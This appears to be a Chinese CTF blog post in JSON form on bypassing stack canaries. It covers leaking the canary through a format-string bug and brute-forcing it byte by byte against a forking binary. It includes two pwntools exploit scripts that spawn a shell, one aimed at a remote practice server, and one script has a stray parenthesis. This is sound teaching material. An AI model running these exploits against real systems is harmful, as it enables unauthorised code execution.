{"title":"绕过canary的方法","uid":"d80adffe0e6ac7d06b461539fbc0ad33","slug":"绕过canary的方法","date":"2021-10-25T12:49:23.000Z","updated":"2021-10-29T10:52:52.635Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/DCnioH4MfqYX28I.jpg","content":"<h1 id=\"泄露地址绕过\"><a href=\"#泄露地址绕过\" class=\"headerlink\" title=\"泄露地址绕过\"></a>泄露地址绕过</h1><p>这种方法对应特定类型的题目，题目中会有两个输入，至少一个输出。通过第一次输入泄露出canary，第二次利用泄露的canary来绕过，从而实现栈溢出</p>\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong><a href=\"https://github.com/Eli0t-g/pwn_appendix/raw/main/canary/stackguard1\">stackguard1</a></strong></h2><p>一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax<img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"屏幕截图 2021-10-22 195020.png\"></p>\n<p>程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置<img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"屏幕截图 2021-10-22 195405.png\"></p>\n<p>__stack_chk_fail函数会强行结束进程并弹出警告</p>\n<p>分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。</p>\n<p><img src=\"https://i.loli.net/2021/10/22/Rq56B1deJrujDh4.png\" alt=\"image.png\"></p>\n<p>通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，仔细分析一下，可以断定圈里面的汇编代码组装成函数execve(“bin/sh”,0,0) 等价于system(“bin/sh”)，所以我们可以利用栈溢出跳转到这里就可以获得shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"屏幕截图 2021-10-22 201418.png\"></p>\n<p>因为是gets函数最后会补上\\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"屏幕截图 2021-10-22 203619.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = (<span class=\"number\">0x4011d6</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># 泄露出第十一个参数的值</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># 将接收的转为十六进制数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"one-by-one爆破\"><a href=\"#one-by-one爆破\" class=\"headerlink\" title=\"one by one爆破\"></a>one by one爆破</h1><p>虽然每次重启程序的canary会不同，但是在同一个进程中不同的线程中的canary是相同的，也就是说fork()函数创建的子进程中的canary是相同的。利用这一点我们可以逐字节爆破出来。</p>\n<h2 id=\"bin1\"><a href=\"#bin1\" class=\"headerlink\" title=\"bin1\"></a>bin1</h2><p>程序中存在fork函数，而且还是无限输出，符合one by one爆破条件，因为是32位程序，canary第一个字符是\\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF</p>\n<p><img src=\"https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png\" alt=\"屏幕截图 2021-10-26 083224.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\">    libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;&#x27;</span>,)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;welcome\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;the &quot;</span> + <span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;: &quot;</span> + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">        p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">&quot;welcome\\n&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> a</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;sucess&quot;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;canary: &quot;</span> + canary</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">addr = <span class=\"number\">0x0804863B</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">100</span> + canary + <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">12</span> + p32(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n","feature":true,"text":"泄露地址绕过这种方法对应特定类型的题目，题目中会有两个输入，至少一个输出。通过第一次输入泄露出canary，第二次利用泄露的canary来绕过，从而实现栈溢出 stackguard1一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放...","link":"","photos":[],"count_time":{"symbolsCount":"2.1k","symbolsTime":"2 mins."},"categories":[{"name":"pwn","slug":"pwn","count":1,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":1,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">泄露地址绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#one-by-one%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">one by one爆破</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bin1\"><span class=\"toc-text\">bin1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"ctfshow-misc","uid":"050531b15fb9d2cd0cab573b50dcfcd8","slug":"ctfshow-misc","date":"2021-10-16T14:43:36.000Z","updated":"2021-11-06T02:17:54.027Z","comments":true,"path":"api/articles/ctfshow-misc.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/nMZwPpxO8NWJRi4.jpg","text":"misc1签到题，打开就有flag misc2打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可 misc3bpg文件使用bpgview工具打开，打开后即可获得flag ","link":"","photos":[],"count_time":{"symbolsCount":98,"symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}